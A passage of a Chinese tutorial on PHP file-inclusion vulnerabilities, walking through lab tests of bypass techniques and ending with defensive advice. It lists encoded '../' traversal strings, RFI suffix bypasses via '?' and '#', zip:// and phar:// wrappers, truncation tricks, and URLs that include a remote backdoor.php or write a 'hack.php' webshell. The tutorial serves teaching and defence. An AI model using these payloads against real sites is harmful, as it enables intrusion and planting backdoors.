    3.所以，这里直接操作原生socket，每次读取4096个字节。只要我们读取到字节里包含临时文件名，就立刻发送文件包含漏洞利用的数据包。因为第一个数据包的socket连接没有结束，所以临时文件还没有删除，我们就可以文件包含成功。
###  其他包含姿势
一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析了。比如还能：包含SMTP(日志)等等，这里就不展开了。
## 绕过姿势
接下来谈一谈绕过姿势。实战的时候肯定不会是像上面`包含姿势`的测试代码中那样简简单单的`include
$_GET['file'];`这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：
这样就很“难”直接去包含前面提到的种种文件。
###  遇到指定前缀的情况
先考虑一下指定了前缀的情况吧。测试代码:
这里存在一个疑惑，不知道有没有人可以解答下：
我测试了用Windows下的phpstudy。如果用Windows的话，`include
'D:\phpStudy\PHPTutorial\WWW\'.$file;`，然后目录遍历`../`会报错`Parse error:syntax
error, unexpected ''D:\phpStudy\PHPTutorial\WWW\'' (T_ENCAPSED_AND_WHITESPACE)
in D:\phpStudy\PHPTutorial\WWW\fileinclude1.php on line
3`，最后一个反斜杠`\`必须要写成正斜杠`/`然后用目录遍历`../`才能成功。
**解决：目录遍历**
现在在`/var/log/test.txt`文件中有php代码``，则利用`../`可以进行目录遍历，比如我们尝试访问：
    include.php?file=../../log/test.txt
则服务器端实际拼接出来的路径为：`/var/www/html/../../log/test.txt`，也即`/var/log/test.txt`。从而包含成功。
[](https://p1.ssl.qhimg.com/t01254a3bc341b1cb02.png)
**解决：编码绕过**
服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。  
 **1.利用url编码**
  * ../ 
    * %2e%2e%2f
    * ..%2f
    * %2e%2e/
  * ..\ 
    * %2e%2e%5c
    * ..%5c
    * %2e%2e\
**2.二次编码**
  * ../ 
    * %252e%252e%252f
  * ..\ 
    * %252e%252e%255c
**3.容器/服务器的编码方式**
  * ../ 
    * ..%c0%af 
      * 注：[Why does Directory traversal attack %C0%AF work?](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
    * %c0%ae%c0%ae/ 
      * 注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）
      * Apache Tomcat Directory Traversal(Apache Tomcat 目录遍历)
  * ..\ 
    * ..%c1%9c
###  遇到指定后缀的情况
接着考虑指定后缀的情况。测试代码:
**解决：URL**
url格式
    protocol://hostname[:port]/path/[;parameters][?query]#fragment
在远程文件包含漏洞（RFI）中，可以利用query（?）或fragment（#）来绕过后缀限制。那么利用条件就需要是：
  1. `allow_url_fopen = On`
  2. `allow_url_include = On`
**姿势一：query（?）**
    index.php?file=http://remoteaddr/remoteinfo.txt?
则包含的文件为 `http://remoteaddr/remoteinfo.txt?/test/test.php`  
问号后面的部分`/test/test.php`，也就是指定的后缀被当作query从而被绕过。
**注意命令执行和写入木马**
如：`http://x.x.x.x/fileinclude2.php?file=http://x.x.x.x/backdoor.php?`
backdoor.php中的php代码为``，结果成功命令执行了
[](https://p2.ssl.qhimg.com/t01efce432255eb6ff6.png)
也可以将php代码替换为`fputs(fopen('hack.php','w'),'');?>`写入木马`hack.php`，用shell管理工具连接
**姿势二：fragment（#(%23)）**
    index.php?file=http://remoteaddr/remoteinfo.txt%23
则包含的文件为 `http://remoteaddr/remoteinfo.txt#/test/test.php`  
问号后面的部分`/test/test.php`，也就是指定的后缀被当作fragment从而被绕过。注意需要把`#`进行url编码为`%23`。
**注意命令执行和写入木马**
如：`http://x.x.x.x/fileinclude2.php?file=http://x.x.x.x/backdoor.php%23`
backdoor.php中的php代码为``，结果成功命令执行了
也可以将php代码替换为`fputs(fopen('hack.php','w'),'');?>`写入木马`hack.php`，用shell管理工具连接
**注意：Windows和Linux下的区别**
在Linux下，是上面这种情况；
在Windows下有些许不同：不加`?`或者`#(%23)`也可以执行，加了也可以执行，而且`#`不进行url编码和进行url编码为`%23`都是可以执行的。
[](https://p1.ssl.qhimg.com/t0163916a79d7a1deca.png)
[](https://p1.ssl.qhimg.com/t0167fb228e826837d4.png)
**解决：利用伪协议**
前面有提到过利用zip伪协议和phar伪协议。假设现在测试代码为：
**姿势一：利用zip伪协议**
构造压缩包如下：
[](https://p0.ssl.qhimg.com/t01eb8b44b7e9918a70.png)
其中test.php内容为：
注意要指定绝对路径，若是使用相对路径，则会文件包含失败。一些别的利用条件等请看上面的`zip://`
    fileinclude2.php?file=zip://D:\phpStudy\PHPTutorial\WWW\J0.zip%23J0
则拼接后为：`zip://D:\phpStudy\PHPTutorial\WWW\J0.zip#J0/test/test.php`
[](https://p0.ssl.qhimg.com/t014e39cc550a88de67.png)
能成功包含。
**注意命令执行和写入木马**
都是可以的，具体看`zip://`
**姿势二：利用phar伪协议**
利用phar伪协议有限制条件：php版本大于等于php 5.3.4。我测试用了php版本为5.2.17，然后使用下面的绝对路径与相对路径的方式都会报错：
    Warning: include(phar://J0.zip\J0/test/test.php) [function.include]: failed to open stream: Invalid argument in D:\phpStudy\PHPTutorial\WWW\fileinclude2.php on line 3
    Warning: include() [function.include]: Failed opening 'phar://J0.zip\J0/test/test.php' for inclusion (include_path='.;C:\php5\pear') in D:\phpStudy\PHPTutorial\WWW\fileinclude2.php on line 3
而以下能成功是因为我用的php版本为5.4.45。
还有一些别的利用条件等请看上面的`phar://`。
构造压缩包同上面姿势一相同
指定绝对路径：
    fileinclude2.php?file=phar://D:\phpStudy\PHPTutorial\WWW\J0.zip\J0
则拼接后为：`phar://D:\phpStudy\PHPTutorial\WWW\J0.zip\J0/test/test.php`
[](https://p1.ssl.qhimg.com/t016a1d0b9e4b5c3767.png)
能成功包含。
使用相对路径（这里`J0.zip`就在当前目录下，和`fileinclude2.php`同一目录）:
    fileinclude2.php?file=phar://J0.zip\J0
则拼接后为：`phar://J0.zip\J0/test/test.php`
[](https://p5.ssl.qhimg.com/t01c409fa37ac9c2890.png)
**注意命令执行和写入木马**
都是可以的，具体看`phar://`
**解决：长度截断**
利用条件： php版本小于php 5.2.8
目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复`./`
    index.php?file=phpinfo.php././././。。。省略。。。././
则后缀`/test/test.php`，在达到最大值后会被直接丢弃掉。
这是我在windows下的实践，如下这样刚刚好截断：
    fileinclude2.php?file=phpinfo.php/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
[](https://p3.ssl.qhimg.com/t01bf650bec620e5d68.png)
成功执行。如果还想再加`./`也是可以的，不过不能超过此服务器的容量限制，不然会这样：
[](https://p5.ssl.qhimg.com/t01f929dd6b107323dd.png)
**注意命令执行和写入木马**
都是可以的，只要将上面的``替换成所对应的php代码，然后进行包含文件即可。
**解决：%00截断**
%00截断原理：
截断的核心，就是 `chr(0)`这个字符。先说一下这个字符，这个字符不为空 `(Null)`，也不是空字符 `("")`，更不是空格。 当程序在输出含有
`chr(0)`变量时 `chr(0)`后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生。
利用条件：
  1. magic_quotes_gpc = Off（当On时，所有的`'`(单引号)，`"` (双引号)，`/`(反斜线)和`NULL`字符都会被自动加上一个反斜杠`\`进行转义。然后这时再用`%00`会变成`\0`，被转义了）
  2. php版本小于php 5.3.4
    index.php?file=phpinfo.php%00
[](https://p2.ssl.qhimg.com/t01bb552732995aeda5.png)
**注意命令执行和写入木马**
都是可以的，只要将上面的``替换成所对应的php代码，然后进行包含文件即可。
## 防御方案
  1. 在很多场景中都需要去包含web目录之外的文件，如果php配置了`open_basedir`，则会包含失败。所以PHP 中使用`open_basedir`配置限制访问在指定的区域。
  2. 做好文件的权限管理。
  3. 对可以包含的文件进行限制，可以采用白名单的方式，或设置可以包含的目录。
  4. 对危险字符进行过滤，比如过滤`.`（点）`/`（反斜杠）`\`（反斜杠）等特殊字符。
  5. 尽量将allow_url_fopen和allow_url_include配置为off，不过像有些伪协议还是能使用，不过能尽量off还是off吧。
  6. 尽量不使用动态包含等等
参考：